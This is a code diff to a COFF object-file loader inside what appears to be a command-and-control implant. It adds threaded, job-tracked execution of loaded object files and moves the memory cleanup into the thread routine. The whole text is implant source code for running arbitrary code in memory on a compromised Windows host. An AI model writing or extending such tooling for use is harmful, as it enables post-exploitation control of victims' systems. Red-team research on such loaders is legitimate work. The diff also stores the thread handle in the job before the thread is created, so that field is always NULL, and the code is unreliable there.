@@ -14,7 +14,6 @@ static DWORD GetSectionProtection(
 BOOL COFFCleanup(
     COFF_CONTEXT *Ctx
 ) {
-
     if (Ctx->SectionBuffer) {
         
         for (int i = 0; i < Ctx->FileHeader->NumberOfSections; i++) {
@@ -35,7 +34,12 @@ BOOL COFFCleanup(
 DWORD COFFRoutine(
     COFF_ENTRYPOINT_DATA* Args
 ) {
-    return Args->Entrypoint(Args->ArgsData, Args->ArgsSize);
+    Args->Entrypoint(Args->ArgsData, Args->ArgsSize);
+
+    COFFCleanup(Args->Context);
+    HeapFree(GetProcessHeap(), 0, Args);
+
+    return 0;
 }
 
 BOOL COFFRun(
@@ -44,18 +48,47 @@ BOOL COFFRun(
     PVOID           ArgsData,
     DWORD           ArgsSize
 ) {
-    COFF_ENTRYPOINT_DATA* COFFEntrypointData = NULL;
+    COFF_ENTRYPOINT         entry       = NULL;
+    COFF_ENTRYPOINT_DATA*   data        = NULL;
+    HANDLE                  hThread     = NULL;
+    PJOB                    Job         = NULL;
 
     for (int i = 0; i < Ctx->FileHeader->NumberOfSymbols; i++) {
         if ( !strcmp( Ctx->SymbolTable[i].First.Name, "go" ) )
 		{
-            DWORD(*Entry)(PVOID data, DWORD size) = (DWORD(*)(PVOID,DWORD))((DWORD_PTR)Ctx->SectionBuffer[Ctx->SymbolTable[i].SectionNumber - 1] + Ctx->SymbolTable[i].Value);
+            entry   = (COFF_ENTRYPOINT)((DWORD_PTR)Ctx->SectionBuffer[Ctx->SymbolTable[i].SectionNumber - 1] + Ctx->SymbolTable[i].Value);
+            data    = (COFF_ENTRYPOINT_DATA*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COFF_ENTRYPOINT_DATA));
+            if (!data) {
+                return FALSE;
+            }
+            
+            data->ArgsData      = ArgsData;
+            data->ArgsSize      = ArgsSize;
+            data->Context       = Ctx;
+            data->Entrypoint    = entry;
 
             if (Sync) {
-                Entry(ArgsData, ArgsSize);
+                COFFRoutine(data);
                 return TRUE;
             } else {
-                return FALSE;
+                Job    = (JOB*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(JOB));
+                if (!Job) {
+                    return FALSE;
+                }
+
+                Job->ID         = RandomUint32();
+                Job->hProcess   = hThread;
+                Job->Status     = TRUE;
+                Job->Type       = JOB_TYPE_THREAD;
+                
+                InsertTailList(&g_Implant.JobList, &Job->ListEntry);
+
+                hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)COFFRoutine, data, 0, NULL);
+                if (!hThread) {
+                    return FALSE;
+                }
+
+                return TRUE;
             }
 
 			return TRUE;
@@ -243,7 +276,7 @@ BOOL COFFLoader(
     PVOID           ArgsData,
     DWORD           ArgsSize
 ) {
-    COFF_CONTEXT* Ctx = NULL;
+    COFF_CONTEXT*   Ctx = NULL;
 
     if (!COFFInitialize(&Ctx, FileData, FileSize)) {
         printf("[-] Failed to parse COFF file\n");
@@ -264,15 +297,13 @@ BOOL COFFLoader(
         return FALSE;
     }
 
-    // printf("[*] Running COFF\n");
-
     // run COFF
     if (!COFFRun(Ctx, Sync, ArgsData, ArgsSize)) {
         printf("[-] Failed to run COFF\n");
         return FALSE;
     }
     
-    COFFCleanup(Ctx);
+    // COFFCleanup(Ctx);
 
     return TRUE;
 }
